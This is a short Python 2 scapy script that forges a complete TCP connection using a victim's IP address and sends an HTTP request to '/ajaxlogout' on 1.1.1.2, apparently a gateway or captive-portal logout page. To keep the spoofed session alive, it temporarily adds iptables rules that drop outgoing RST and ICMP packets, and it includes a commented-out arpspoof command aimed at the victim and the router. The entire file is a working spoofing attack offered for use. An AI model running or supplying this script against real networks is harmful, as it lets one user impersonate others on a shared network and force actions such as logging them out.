from scapy.all import IP,TCP,send,sr1
import os,time,sys

os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
os.system("iptables -A FORWARD -p tcp --tcp-flags RST RST -j DROP")
os.system("iptables -A OUTPUT -p icmp -j DROP")
os.system("iptables -A FORWARD -p icmp -j DROP")

iface = sys.argv[1]
tIP = sys.argv[2]
router = sys.argv[3]
#iface = sys.argv[1]
#f = os.popen("arpspoof -i %s -t %s %s -r" %(iface, router, tIP) )
HTTPSTR = 'GET /ajaxlogout?t=233 HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n'
#HTTPSTR = 'GET http://192.168.171.143/showip.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n'
domain = "1.1.1.2"
http = HTTPSTR % (domain,"FaQ/233.33")
try:
    tout = 10
    sport = 60233
    dport = 80
    # SYN
    ip=IP(src=tIP,dst=domain)
    #send(ip/TCP(sport=sport, dport=dport, flags="R"))
    SYN=TCP(sport=sport,dport=dport,flags='S',seq=0)
    print "Sending SYN..."
    SYNACK=sr1(ip/SYN, timeout=tout)
    #send(ip/SYN)

    #time.sleep(0.05)
    # ACK
    ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    #ACK=TCP(sport=sport, dport=dport, flags='A', seq=1, ack=1)
    print "Sending ACK"
    send(ip/ACK)
    #RESPACK = sr1(ip/ACK)
    
    #time.sleep(0.1)
    print "Waiting for first RESP..."
    RESP = sr1( ip / TCP(sport=sport, dport=dport , flags='PA', seq=SYNACK.ack, ack=SYNACK.seq + 1 ) / http, timeout=tout)
    try:
        print str(RESP.flags)
    except:
        print "Oops!"
        #request = IP(dst=domain) / TCP(dport=80) / http
    #send(request)
    for i in xrange(1):
        print "Waiting..."
        RESP = sr1(ip / TCP(sport=sport, dport=dport ,flags="A", seq=RESP.ack), timeout=tout)
        #if RESP.flags & 1:break
    #FIN-ACK ,expect ACK
    print "Sending FIN-ACK..."
    send(ip / TCP(sport=sport, dport=dport ,flags="FA", seq=RESP.ack, ack=RESP.ack + 1) )
except:
    pass

#send(ip/TCP(sport=sport, dport=dport, flags="RA" ,seq=RESP.ack, ack=RESP.ack + 1))

os.system("iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
os.system("iptables -D FORWARD -p tcp --tcp-flags RST RST -j DROP")
os.system("iptables -D OUTPUT -p icmp -j DROP")
os.system("iptables -D FORWARD -p icmp -j DROP")
